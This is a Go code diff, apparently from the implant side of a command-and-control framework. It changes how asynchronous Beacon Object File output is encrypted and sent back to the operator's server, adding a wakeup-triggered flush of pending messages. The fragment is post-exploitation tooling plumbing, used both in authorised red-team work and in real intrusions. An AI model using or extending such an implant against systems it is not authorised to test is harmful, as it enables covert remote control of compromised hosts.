@@ -631,7 +631,6 @@ func taskZip(paramsData []byte) ([]byte, error) {
 /// JOBS
 
 func jobExecBofAsync(paramsData []byte) ([]byte, error) {
-
 	var params utils.ParamsExecBof
 	if err := msgpack.Unmarshal(paramsData, &params); err != nil {
 		return nil, err
@@ -751,8 +750,27 @@ func jobExecBofAsync(paramsData []byte) ([]byte, error) {
 					bofMsg = utils.BofMsg{}
 				}
 
-			case <-ticker.C:
+			case <-WakeupChan:
 				if len(pendingMsgs) > 0 {
+					packMsgs, _ := msgpack.Marshal(pendingMsgs)
+					ansBofAsync := utils.AnsExecBofAsync{Msgs: packMsgs}
+
+					job.Data, _ = msgpack.Marshal(ansBofAsync)
+					packedJob, _ := msgpack.Marshal(job)
+
+					message := utils.Message{
+						Type:   2,
+						Object: [][]byte{packedJob},
+					}
+					sendData, _ := msgpack.Marshal(message)
+					sendData, _ = utils.EncryptData(sendData, utils.SKey)
+					functions.SendMsg(conn, sendData)
+
+					pendingMsgs = pendingMsgs[:0]
+				}
+
+			case <-ticker.C:
+				if len(pendingMsgs) >= 1 {
 					packMsgs, _ := msgpack.Marshal(pendingMsgs)
 					ansBofAsync := utils.AnsExecBofAsync{Msgs: packMsgs}
 
